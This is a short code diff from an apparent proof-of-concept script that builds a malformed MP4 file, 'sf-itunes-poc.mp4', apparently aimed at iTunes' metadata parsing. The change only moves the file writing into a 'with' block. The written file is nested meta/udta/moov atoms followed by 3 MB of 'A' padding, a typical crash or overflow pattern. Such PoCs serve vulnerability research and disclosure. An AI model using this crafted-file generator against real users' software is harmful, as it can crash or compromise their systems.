@@ -21,7 +21,6 @@ meta_atom = create_box("meta", pack("!I", 0) + ilst_atom)
 udta_atom = create_box("udta", meta_atom)
 moov_atom = create_box("moov", udta_atom)
 
-f = open('sf-itunes-poc.mp4', 'wb')
-f.write(ftyp_atom + moov_atom)
-f.write("A"*(3*1024*1024))
-f.close()
+with open('sf-itunes-poc.mp4', 'wb') as f:
+    f.write(ftyp_atom + moov_atom)
+    f.write("A"*(3*1024*1024))
